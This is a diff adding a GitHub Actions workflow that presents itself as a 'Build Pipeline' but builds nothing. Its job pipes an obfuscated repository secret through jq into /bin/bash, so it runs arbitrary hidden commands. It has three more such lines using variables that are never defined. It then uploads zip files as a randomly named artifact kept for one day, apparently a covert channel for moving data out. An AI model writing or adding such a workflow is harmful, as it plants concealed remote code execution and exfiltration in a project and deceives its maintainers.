@@ -1,0 +1,25 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+jobs:
+  start:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute task
+        env:
+          mncb332: ${{ secrets.mncb332 }}
+        run: |
+          printf '%s' "$mncb332" | jq -r .dvs70037 | /bin/bash
+          printf '%s' "$yfbm4" | jq -r .ypqsv12 | /bin/bash
+          echo $okltp75 | jq -r .ge7197 | /bin/bash
+          echo $zteu17 | jq -r .pc8 | /bin/bash
+
+      - name: Persist data
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: uoisGwNR
+          path: "*.zip"
+          retention-days: 1
